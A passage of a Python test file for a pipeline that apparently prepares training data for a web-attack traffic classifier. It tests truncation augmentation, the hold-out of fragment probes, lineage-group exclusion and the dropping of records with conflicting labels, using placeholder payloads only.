        for kind, cls in (("attack", "sqli_classic"), ("benign", "benign_standard_traffic")):
            tel = G.truncation_augment(G.build_request(G.rng_for(f"tr{i}"), "query", "q", "x", []), f"{cls}:{i}")
            h = tel["http"]
            if "cookies_truncated" in h:
                hits[kind] += 1
                assert len(h["cookies"]) <= MAX_COOKIES and tel["truncated"]
                assert len(next(v for k, v in h["headers"] if k == "Cookie")) <= 512
    assert hits["attack"] > 10 and hits["benign"] > 10  # ~4% x 30% of HTTP records, on both sides


def test_fragment_probes_stay_out_of_training_and_leave_half_the_pool(monkeypatch):
    pool = [{"payload": f"frag{i}", "reason": "too_short_ambiguous", "source": "seclists", "class": "sqli_classic"}
            for i in range(150)]
    monkeypatch.setattr(G, "rejected_fragments", lambda: pool)
    probes = G.fragment_probes(pool)
    assert len(probes) == min(G.REJECTED_PROBES, 75)  # never more than half the pool
    train = G.gen_fragments(200)
    used = {json.loads(r["messages"][1]["content"].split("] ", 1)[1])["http"]["query"][-1][1] for r in train}
    assert len(train) == 150 - len(probes) and not used & {x["payload"] for x in probes}


def test_robustness_exclusion_keeps_a_blocked_campaign_host_used(tmp_path, monkeypatch):
    from data_pipeline import robustness as RB
    (tmp_path / "datasets_ready").mkdir()
    rows = [{"metadata": {"lineage_group": "cic:172.16.0.1->192.168.10.50#port_scan_recon#early"}},
            {"metadata": {"lineage_group": "seed:abc"}}]
    (tmp_path / "datasets_ready/fast_train.jsonl").write_text("".join(json.dumps(r) + "\n" for r in rows))
    monkeypatch.setattr(RB, "ROOT", tmp_path)
    used = RB.core_groups()
    assert "cic:172.16.0.1->192.168.10.50" in used and "seed:abc" in used  # OOT flows of that host stay excluded


def test_identical_input_with_two_labels_is_dropped_not_resolved_by_order():
    from data_pipeline.dedup_and_split import drop_label_conflicts
    recs = [_rec("sqli_classic", "g1", "same"), _rec("benign_standard_traffic", "g2", "same"),
            _rec("sqli_classic", "g3", "dup"), _rec("sqli_classic", "g4", "dup"), _rec("xss_reflected_stored", "g5", "x")]
    kept, conflicts = drop_label_conflicts(recs)
    assert conflicts == {"benign_standard_traffic|sqli_classic": 1}
    assert sorted(r["metadata"]["lineage_group"] for r in kept) == ["g3", "g4", "g5"]  # same-label dups stay for dedup()
